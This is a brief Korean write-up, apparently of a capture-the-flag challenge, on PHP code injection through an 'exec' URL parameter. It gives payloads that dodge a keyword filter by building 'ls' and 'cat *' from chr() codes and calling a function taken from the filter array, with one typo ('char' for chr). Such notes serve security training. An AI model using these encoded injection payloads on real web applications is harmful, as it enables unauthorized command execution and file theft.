# 개요
웹 기반 필터링을 우회해서 특정 함수 등의 코드나 외부 프로그램 실행
exec 변수로 php code injection 공격 수행

## exploit
1. $filter 배열에 있는걸 그대로 사용해도 됨
> ?exec=$filter[0](char(108).chr(115)); = system(ls)
>> php 에서는 문자열 합치는걸 . 를 사용함
2. 이 때 나오는 flag 파일을 그대로 실행해도 되고 아니면 cat으로 실행
> ?exec=$filter[0](chr(99).chr(97).chr(116).chr(32).chr(42));